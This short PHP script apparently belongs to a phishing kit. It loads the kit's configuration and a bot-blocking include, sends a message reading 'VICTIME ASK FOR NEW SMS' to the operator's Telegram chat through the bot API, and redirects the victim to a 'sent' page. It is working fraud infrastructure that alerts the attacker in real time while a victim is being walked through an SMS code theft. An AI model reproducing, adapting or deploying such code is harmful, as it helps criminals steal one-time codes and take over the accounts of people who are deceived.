<?php
include("../owner/config.php");
include "../files/php/sys.php";
include '../files/php/911/botfucker.php'; 
$token = "$ovnitoken";
    $data = [
    'text' => '🔄 VICTIME ASK FOR NEW SMS 🔄',
    'chat_id' => $ovnichat,
    ];
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    header("Location: ../sent.php")

?>